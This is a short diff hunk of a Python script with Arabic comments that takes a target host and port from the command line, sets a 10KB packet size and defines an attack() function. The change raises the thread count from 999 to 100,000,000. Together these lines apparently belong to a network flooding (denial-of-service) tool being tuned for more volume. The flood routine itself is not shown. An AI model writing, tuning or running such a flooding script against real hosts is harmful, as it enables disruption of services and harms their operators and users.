@@ -5,7 +5,7 @@ import threading
 
 host = sys.argv[1]
 port = int(sys.argv[2])
-threads = 999  # عدد الثريدات
+threads = 100000000  # عدد الثريدات
 packet_size = 10240  # حجم الباكيت = 10KB
 
 def attack():
